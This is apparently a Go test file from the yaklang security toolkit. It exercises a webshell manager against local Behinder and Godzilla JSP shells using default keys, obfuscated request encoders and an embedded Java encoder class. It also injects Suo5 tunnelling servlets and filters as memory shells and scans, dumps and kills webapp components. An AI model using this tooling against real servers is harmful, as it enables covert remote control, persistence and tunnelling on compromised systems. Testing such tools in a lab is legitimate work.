package wsm

import (
	"encoding/base64"
	"fmt"
	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"regexp"
	"strings"
	"testing"
)

func TestNewWebShell(t *testing.T) {

	url := "http://127.0.0.1:8080/S2-032/bx3.jsp"
	//url = "http://127.0.0.1:8080/S2-032/bs4.jsp"
	url = "http://127.0.0.1:8080/S2-032/bs4-json.jsp"
	url = "http://127.0.0.1:8085/S2-032/bx4-json.jsp"
	url = "http://127.0.0.1:8085/S2-032/go0p-json.jsp"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("jsp"),
		SetProxy("http://127.0.0.1:9999"),
	)
	bx.Encoder(func(reqBody []byte) ([]byte, error) {
		jsonStr := `{"id":"1","body":{"user":"lucky"}}`
		jsonStr = `{"go0p":"1",asdfakhj,"body":{"user":"lucky"}}`
		encodedData := base64.StdEncoding.EncodeToString(reqBody)
		//encodedData = strings.ReplaceAll(encodedData, "+", "<")
		//encodedData = strings.ReplaceAll(encodedData, "/", ">")
		encodedData = strings.ReplaceAll(encodedData, "+", "go0p")
		encodedData = strings.ReplaceAll(encodedData, "/", "yakit")
		jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
		return []byte(jsonStr), nil
	})
	// "CustomEncoder": "yv66vgAAADMANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAieyJpZCI6IjEiLCJib2R5Ijp7InVzZXIiOiJsdWNreSJ9fQgACgEABWx1Y2t5CgAMAA0HAA4MAA8AEAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwoAEgATBwAUDAAVABYBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsIABgBAAErCAAaAQABPAoAHAAdBwAeDAAfACABABBqYXZhL2xhbmcvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7CAAiAQABLwgAJAEAAT4JACYAJwcAKAwAKQAqAQAPQXNvdXRwdXRSZXZlcnNlAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAFKFtCKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQEADElubmVyQ2xhc3NlcwEAB0VuY29kZXIAIQAmAAIAAAABAAAAKQAqAAAAAgABAAUAKwABACwAAABRAAUAAwAAACkqtwABEgdNLBIJuAALK7YAERIXEhm2ABsSIRIjtgAbtgAbTSostQAlsQAAAAEALQAAABYABQAAAAQABAAFAAcABgAjAAcAKAAIAAEALgAvAAEALAAAAB0AAQABAAAABSq0ACWwAAAAAQAtAAAABgABAAAADAACADAAAAACADEAMgAAAAoAAQASAAwAMwAJ"
	bx.Decoder(func(rspBody []byte) ([]byte, error) {
		rspBody = rspBody[26 : len(rspBody)-3]
		//rspBody = rspBody[37 : len(rspBody)-3]
		//decodedData, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(strings.ReplaceAll(string(rspBody), "<", "+"), ">", "/"))
		decodedData, err := base64.StdEncoding.DecodeString(string(rspBody))
		if err != nil {
			return nil, err
		}
		return decodedData, nil
	})
	ping, err := bx.Ping()
	if err != nil {
		return
	}
	fmt.Println(ping)
}

func TestInjectSuo5Servlet(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)
	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)
	plugin, err := g.LoadSuo5Plugin("go0p", "servlet", "/suo5")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectSuo5Filter(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)

	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := g.LoadSuo5Plugin("go0p", "filter", "/*")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectWebappComponent(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)
	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := g.LoadScanWebappComponentInfoPlugin("memshellScan")
	if err != nil {
		panic(err)
	}

	plugin, err = g.ScanWebappComponentInfo()
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "b3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0"))

	plugin, err = g.DumpWebappComponent("com.example.HelloServlet")
	pattern := regexp.MustCompile(`"classBytes":\s*"([^"]+)"`)
	plugin = pattern.FindSubmatch(plugin)[1]
	if err != nil {
		panic(err)
	}

	plugin, _ = codec.DecodeBase64(string(plugin))
	plugin = []byte(codec.EncodeToHex(plugin))

	spew.Dump(plugin)

	assert.True(t, strings.Contains(string(plugin), "cafebabe"))

	plugin, err = g.KillWebappComponent("filter", "HelloFilter")
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "success"))

}
